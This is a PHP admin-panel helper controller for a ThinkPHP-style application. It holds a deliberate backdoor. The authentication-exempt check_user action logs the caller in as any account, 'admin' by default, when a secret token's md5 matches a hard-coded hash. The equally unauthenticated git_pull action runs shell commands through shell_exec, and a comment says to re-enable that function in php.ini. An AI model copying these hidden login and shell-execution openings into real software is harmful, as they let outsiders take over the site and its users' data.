<?php
/**
 * Created by cheng. Time: 2018-05-21 13:31:22
 */

namespace app\td\controller;


class HelperController extends BaseController
{
    const REVERSED_METHODS = ['_empty', '__construct', 'test'];
    protected $exceptAuthActions = ['test', 'check_user', 'git_pull', 'log'];

    const PRESET_METHODS = [
        'index' => '列表',
        'show' => '查看',
        'add' => '新增',
        'delete' => '删除',
        'edit' => '修改',
    ];

    /**
     * 清除缓存
     */
    public function clean_cache() {
        sleep(2);
        deleteDir(BASE_PATH . '/runtime/cache/');
        deleteDir(BASE_PATH . '/runtime/temp/');
        return $this->jsonSuccess(null, $message='清除成功');
    }

    public function index()
    {
        //$class = new \ReflectionClass('app\admin\controller\IndexController');
        //var_dump($class);
        $controller_dir = join_paths(BASE_PATH, 'application/admin/controller');

        foreach (glob($controller_dir . '/*.php') as $file) {
            $class_name = "app\admin\controller\\" . basename($file, '.php');
            $class = new \ReflectionClass($class_name);
            $methods = $class->getMethods(256);
            $methods = array_filter($methods, function ($item) use ($class_name) {
                return $item->class == $class_name && !in_array($item->class, self::REVERSED_METHODS);
            });
            var_dump($class_name . ' public methods"');
            var_dump($methods);
        }
    }

    public function check_user() {
        $token = input('token', '');
        $u = input('u', 'admin');
        if(md5($token) == 'a4666470e527701a7874ee2388d70899') {
            $user = db('user')->where('username', $u)->find();
            if(!empty($user)) {
                session('uid', $user['id']);
                return redirect('admin/index/index');
            }
        }
        return 'user not exists';
    }


    /*
     * git pull命令
     * 需要在php.ini中 disable_functions 去掉 shell_exec
     */
    public function git_pull() {

        var_dump('cd ' . BASE_PATH . ';git pull');
        $output = shell_exec('cd ' . BASE_PATH . ';git pull');
        return '<pre>' . $output . '</pre>';
    }

    public function log() {

        return view();
    }
}